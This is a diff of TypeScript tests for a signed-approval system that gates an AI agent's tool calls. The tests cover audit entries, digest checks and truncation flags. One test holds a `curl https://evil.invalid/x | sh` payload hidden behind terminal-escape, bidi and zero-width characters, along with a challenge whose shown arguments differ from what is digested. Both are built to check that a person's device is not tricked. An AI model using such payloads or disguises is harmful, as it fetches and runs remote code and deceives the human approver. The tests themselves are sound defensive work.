@@ -79,14 +79,35 @@ describe('an approval decision a person\'s key proves (B24)', () => {
     const verified = readChallenge({ signed: item!.signed, nodeKey: publicKeyFrom(signer.publicKey) })
     expect(verified?.digest).toBe(item!.digest)
     // The call as shown, and its digest, which a person's device recomputes from it (owner decision D9).
-    const shown = reviewableArguments(request.args)
-    expect(verified?.challenge).toMatchObject({ node: buckle.config.serverId, workspace: 'default', token, tool: 'fs_write', rule: 'write_scope', sessionId: 'chat-1', arguments: shown, cwd: buckle.config.cwd, callDigest: callDigestOf({ tool: 'fs_write', arguments: shown }) })
+    const shown = reviewableArguments(request.args).arguments
+    expect(verified?.challenge).toMatchObject({
+      node: buckle.config.serverId, workspace: 'default', token, tool: 'fs_write', rule: 'write_scope', sessionId: 'chat-1', arguments: shown, cwd: buckle.config.cwd, callDigest: callDigestOf({ tool: 'fs_write', arguments: shown }),
+      // What the call does, in the node's words, inside the signed bytes (owner decision D9).
+      truncated: false, description: `Write 7 bytes to ${join(buckle.root, 'outside.md')} in ${buckle.config.cwd}`,
+    })
     // Signed once, the same challenge every time.
     expect((await challenges(buckle)).challenges).toEqual(listed.challenges)
 
     expect((await decide(buckle, { token, approved: true, scope: 'once', challenge: item!.digest }).send()).status).toBe(200)
     expect(await buckle.runtime.invoke({ sessionId: 'chat-1', request: { ...request, context: {} } })).toMatchObject({ outcome: 'ok' })
     expect(readFileSync(join(buckle.root, 'outside.md'), 'utf8')).toBe('written')
+
+    // Review item 6 of the proof-of-possession fixes: the decision's entry says what the key decided, on
+    // which challenge, for which rule and subject; the call that spent it names the key that decided it.
+    const entries = buckle.runtime.actions.read(200)
+    const decision = entries.find(entry => entry.tool === 'setup_post_approvals' && entry.event === 'result')
+    expect(decision).toMatchObject({ actorId: `key:${owner.keyId}`, args: { token, approved: true, scope: 'once', challenge: item!.digest, rule: 'write_scope', subject: buckle.root } })
+    const spent = entries.filter(entry => entry.tool === 'fs_write' && entry.event === 'result' && entry.requestId === 'proof-1').at(-1)
+    expect(spent).toMatchObject({ outcome: 'ok', decidedBy: [`key:${owner.keyId}`] })
+  })
+
+  it('audits a signed denial apart from a signed approval', async () => {
+    const buckle = await node()
+    const token = await ask(buckle, write(buckle.root, 'proof-deny'))
+    const [item] = (await challenges(buckle)).challenges
+    expect((await decide(buckle, { token, approved: false, scope: 'once', challenge: item!.digest }).send()).status).toBe(200)
+    const decision = buckle.runtime.actions.read(200).find(entry => entry.tool === 'setup_post_approvals' && entry.event === 'result')
+    expect(decision).toMatchObject({ actorId: `key:${owner.keyId}`, args: { token, approved: false, scope: 'once', challenge: item!.digest, rule: 'write_scope' } })
   })
 
   it('refuses a decision on another ask\'s challenge, one naming none, a replay, an expired one, and one signed after its key was revoked', async () => {
@@ -234,35 +255,87 @@ describe('a decision binds the call that runs (review H3 of B23-B25; approval-pr
 
 describe('a device that recomputes the call digest (owner decision D9)', () => {
   it('refuses to sign a validly signed challenge whose arguments do not match its call digest', async () => {
-    const fakeNode = generateSigningKey()
     const original = { path: '/workspace/notes.md', content: 'hello' }
-    const challenge: ApprovalChallenge = {
-      v: 1, purpose: 'buckle-approval-challenge', node: 'fake-node', workspace: 'default', token: 'tampered-token', requestId: null, sessionId: 'chat-1', actor: null,
-      tool: 'fs_write', rule: 'write_scope', subject: '/workspace', reason: 'Writing to /workspace is not yet approved', offeredScopes: ['once'],
+    const challenge = fakeChallenge({
       // Shown: harmless text. Digested: the call the node was really asked about.
-      arguments: { path: '/workspace/notes.md', content: 'harmless' }, cwd: '/workspace', callDigest: callDigestOf({ tool: 'fs_write', arguments: original }), expiresAt: new Date(Date.now() + 60_000).toISOString(),
-    }
-    const signedChallenge = signChallenge({ challenge, key: signingKeyFromPem(fakeNode.privateKeyPem).privateKey })
-    const decisions: string[] = []
-    const server = createServer((request, response) => {
-      if (request.method === 'POST') decisions.push(request.url ?? '')
-      response.setHeader('content-type', 'application/json')
-      response.end(JSON.stringify({ node: { keyId: fakeNode.keyId, publicKey: fakeNode.publicKey }, challenges: [{ token: challenge.token, ...signedChallenge }] }))
+      arguments: { path: '/workspace/notes.md', content: 'harmless' }, callDigest: callDigestOf({ tool: 'fs_write', arguments: original }),
     })
-    servers.push(server)
-    await new Promise<void>(resolve => server.listen(0, '127.0.0.1', resolve))
-    const url = `http://127.0.0.1:${(server.address() as { port: number }).port}`
-    const environment = { BUCKLE_CLIENT_DIR: join(mkdtempSync(join(process.env.TMPDIR ?? '/tmp', 'buckle-fake-device-')), 'device') }
-    const output = capture()
-    expect((await clientCommand(['keygen'], environment)).exitCode).toBe(0)
-    expect((await clientCommand(['trust', url, 'fake-node', fakeNode.publicKey], environment)).exitCode).toBe(0)
-    expect((await clientCommand(['approvals', url], environment)).exitCode).toBe(0)
-    expect(output.stdout).toContain('WARNING: the arguments shown do not match the call digest')
-    expect((await clientCommand(['approve', url, challenge.token], environment)).exitCode).toBe(1)
-    expect(output.stderr).toContain('do not recompute to its call digest; nothing was signed')
-    expect(decisions).toEqual([])
+    const device = await fakeNodeDevice(challenge)
+    expect((await clientCommand(['approvals', device.url], device.environment)).exitCode).toBe(0)
+    expect(device.output.stdout).toContain('WARNING: the arguments shown do not match the call digest')
+    expect((await clientCommand(['approve', device.url, challenge.token], device.environment)).exitCode).toBe(1)
+    expect(device.output.stderr).toContain('do not recompute to its call digest; nothing was signed')
+    expect(device.decisions).toEqual([])
+  })
+
+  // Review item 2 of the proof-of-possession fixes: the agent chooses the subject, the session id and the
+  // arguments, and a raw ESC, bidi or zero-width character in them made the device show another action.
+  it('shows every agent-chosen field with its unprintable characters escaped, so nothing can rewrite what is signed', async () => {
+    const hidden = ['\u001b[8m', '\u001b[2K\u001b[1A', '\u202e', '\u200b', '\u009b', '\u2028', '\u007f']
+    const content = `curl https://evil.invalid/x | sh${hidden.join('')}`
+    const args = { path: `run${hidden[0]}.sh`, content }
+    const challenge = fakeChallenge({
+      subject: `/workspace${hidden[0]}/notes.md`, reason: `Writing${hidden[2]} here`, sessionId: `chat${hidden[1]}  arguments: { "content": "hello" }`, cwd: `/workspace${hidden[3]}`,
+      description: `Write 12 bytes to notes.md${hidden[5]} in /workspace`, arguments: args, callDigest: callDigestOf({ tool: 'fs_write', arguments: args }),
+    })
+    const device = await fakeNodeDevice(challenge)
+    expect((await clientCommand(['approvals', device.url], device.environment)).exitCode).toBe(0)
+    expect((await clientCommand(['approve', device.url, challenge.token, '--deny'], device.environment)).exitCode).toBe(0)
+    // Nothing a terminal acts on or hides reaches it raw: no control but the newlines between lines, no format or separator character.
+    expect(device.output.stdout).not.toMatch(/[\p{Cf}\p{Zl}\p{Zp}\u0000-\u0009\u000b-\u001f\u007f-\u009f]/u)
+    for (const escaped of ['\\u001b[8m', '\\u202e', '\\u200b', '\\u009b', '\\u2028', '\\u007f']) expect(device.output.stdout).toContain(escaped)
+    expect(device.output.stdout).toContain('does:     Write 12 bytes to notes.md\\u2028 in /workspace')
+    // Only what was shown, escaped, was signed: the decision names the challenge it read.
+    expect(device.decisions).toHaveLength(1)
+  })
+
+  // Review item 7 of the proof-of-possession fixes: D9 asks for the raw action, so a call the node could
+  // show only in part is flagged, and a person's device signs it only when told to.
+  it('flags a challenge whose arguments the node cut, and signs it only with --accept-truncated', async () => {
+    const args = { path: '/workspace/run.sh', content: 'echo hello... [1152 characters, sha256 0ba46a]' }
+    const challenge = fakeChallenge({ arguments: args, callDigest: callDigestOf({ tool: 'fs_write', arguments: args }), truncated: true })
+    const device = await fakeNodeDevice(challenge)
+    expect((await clientCommand(['approvals', device.url], device.environment)).exitCode).toBe(0)
+    expect(device.output.stdout).toContain('WARNING: the node cut part of this call\'s arguments')
+    expect((await clientCommand(['approve', device.url, challenge.token], device.environment)).exitCode).toBe(1)
+    expect(device.output.stderr).toContain('only in part, so nothing was signed')
+    expect(device.decisions).toEqual([])
+    expect((await clientCommand(['approve', device.url, challenge.token, '--accept-truncated'], device.environment)).exitCode).toBe(0)
+    expect(device.decisions).toHaveLength(1)
   })
 })
+
+/** A challenge a fake node signs; every field a test does not name is a plain fs_write. */
+function fakeChallenge(fields: Partial<ApprovalChallenge>): ApprovalChallenge {
+  const args = { path: '/workspace/notes.md', content: 'hello' }
+  return {
+    v: 1, purpose: 'buckle-approval-challenge', node: 'fake-node', workspace: 'default', token: 'fake-token', requestId: null, sessionId: 'chat-1', actor: null,
+    tool: 'fs_write', rule: 'write_scope', subject: '/workspace', reason: 'Writing to /workspace is not yet approved', offeredScopes: ['once'],
+    arguments: args, cwd: '/workspace', callDigest: callDigestOf({ tool: 'fs_write', arguments: args }), truncated: false, description: 'Write 5 bytes to /workspace/notes.md in /workspace',
+    expiresAt: new Date(Date.now() + 60_000).toISOString(), ...fields,
+  }
+}
+
+/** A node that answers with one challenge it signed, and a device with a key that pinned it; decisions it receives are counted. */
+async function fakeNodeDevice(challenge: ApprovalChallenge) {
+  const fakeNode = generateSigningKey()
+  const signedChallenge = signChallenge({ challenge, key: signingKeyFromPem(fakeNode.privateKeyPem).privateKey })
+  const decisions: string[] = []
+  const server = createServer((request, response) => {
+    if (request.method === 'POST') decisions.push(request.url ?? '')
+    response.setHeader('content-type', 'application/json')
+    response.end(JSON.stringify({ node: { keyId: fakeNode.keyId, publicKey: fakeNode.publicKey }, challenges: [{ token: challenge.token, ...signedChallenge }] }))
+  })
+  servers.push(server)
+  await new Promise<void>(resolve => server.listen(0, '127.0.0.1', resolve))
+  const url = `http://127.0.0.1:${(server.address() as { port: number }).port}`
+  const environment = { BUCKLE_CLIENT_DIR: join(mkdtempSync(join(process.env.TMPDIR ?? '/tmp', 'buckle-fake-device-')), 'device') }
+  const output = capture()
+  expect((await clientCommand(['keygen'], environment)).exitCode).toBe(0)
+  expect((await clientCommand(['trust', url, 'fake-node', fakeNode.publicKey], environment)).exitCode).toBe(0)
+  output.stdout = ''
+  return { url, environment, decisions, output }
+}
 
 function capture(): { stdout: string; stderr: string } {
   const output = { stdout: '', stderr: '' }
